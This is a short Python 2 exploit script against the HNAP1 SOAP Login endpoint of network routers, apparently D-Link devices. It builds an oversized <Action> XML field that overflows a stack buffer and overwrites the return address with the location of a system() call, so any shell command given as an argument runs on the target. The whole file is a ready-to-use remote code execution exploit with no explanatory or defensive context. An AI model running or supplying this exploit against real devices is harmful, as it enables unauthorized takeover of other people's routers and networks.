#!/usr/bin/env python
# -*- coding: utf-8 -*-


import struct
import sys

import requests


StackSize = 0x400
JunkSize = 0x14
CallSystem = 0x1B50C


def p32(addr, sign="unsigned"):
    fmt = "<I"
    if sign == "signed":
        fmt = "<i"
    return struct.pack(fmt, addr)


def exploit(host, port, cmd):
    cmd = cmd if cmd.endswith(";") else cmd + ";"
    payload = "<Action>{}".format(cmd)
    payload += "A" * (StackSize - len(cmd)) + p32(0xffffffff) + "A" * JunkSize
    payload += p32(CallSystem)[:3]                                              # avoid "\00"
    payload += "</Action>"

    url = "http://{}:{}/HNAP1/".format(host, port)
    header = {
        "SOAPACTION": "http://purenetworks.com/HNAP1/Login",
        "Content-Type": "text/html"
    }
    try:
        resp = requests.post(url, payload, headers=header, timeout=3)
        resp.close()
    except Exception as ex:
        return "error: {}".format(ex)
    return resp.text


def main():
    if len(sys.argv) != 4:
        print "Usage: {} <host> <port> <cmd>".format(sys.argv[0])
        exit(1)
    print exploit(sys.argv[1], sys.argv[2], sys.argv[3])


if __name__ == "__main__":
    main()
